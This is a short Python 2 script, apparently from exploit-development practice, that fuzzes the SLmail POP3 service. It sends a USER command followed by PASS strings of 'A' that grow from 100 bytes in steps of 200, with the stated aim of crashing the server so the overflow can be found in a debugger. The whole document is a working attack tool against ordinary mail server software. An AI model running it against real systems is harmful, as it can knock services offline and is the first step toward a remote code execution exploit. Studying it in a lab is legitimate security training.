#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and increment by 200 in order to attempt to crash SLmail.

buff=["A"]

# Maximum size of buffer.

max_buffer = 4000

# Initial counter value.

counter = 100

# Value to increment per attempt.

increment = 200


while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash SLmail at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send('USER jesse\r\n')
        s.recv(1023)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()
     except: 
        print "[+] Connection failed. Make sure IP/port are correct, or check debugger for SLmail crash."
        sys.exit()
